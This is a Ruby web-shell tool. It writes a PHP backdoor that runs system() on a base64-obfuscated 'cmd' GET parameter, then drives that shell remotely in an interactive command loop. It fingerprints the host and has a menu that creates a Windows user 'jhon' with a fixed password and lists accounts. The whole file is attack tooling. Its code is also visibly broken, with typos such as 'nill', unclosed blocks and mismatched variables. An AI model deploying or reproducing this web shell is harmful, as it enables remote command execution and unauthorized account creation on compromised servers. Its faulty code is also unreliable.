#!/usr/bin/env/ruby 
require 'open-uri'
require 'colorize'

$name = ARGV[0]
$uri = ARGV[1]

if ($name == nil) and ($uri = nill) then
    puts"
    USAGE ra.rb start <site/shell.php>
    ra.rb shell.php
    ".red

if ($name != nil) and ($uri == nil) then

    $shell = """ <?php echo system($_GET[base64_decode('Y21k')]);?>"""
    $f = File.new("#{$name}", "w")
    $f.write($shell)
    $f.close

    puts "The File #{$name} has been created successfully!".green
end

if ($name == "start") and ($uri != nil) then 
    $inf = open("http://#{$uri}?cmd=ver").read
    $inf2 = open("http://#{uri}?cmd=uname -a").read
    puts "#{inf}#{inf2}".green
    while true do
        print "<@root>".red
        ARGV.clear
        $command = gets.chomp

        if $command == "help" then 
            puts "[0] Create User"
            puts "[1] Add User to ADMIN_GROUP"
            puts "[2] Show users"

            if $info["Microsoft Windows"].nil? then
            
            else 
                while true do

                    puts "----------------------------------"
                    print "@WINDOWS :: ".green
                    $options = gets.chomp
                    puts "----------------------------------"

                    if $option == "0" then 
                        puts open("http://#{uri}?cmd=net user jhon 14243454 /add").red
                        puts "User Jhon has been added with 14243454 as password!".green
                    end

                    if $option == "1" then 
                        puts open("http://#{$uri}?cmd=net users").read
                    end
                end
            end
        end
    $html = open("http://#{$uri}?cmd=#{$command}").read
    
    puts $html
    
    end

end
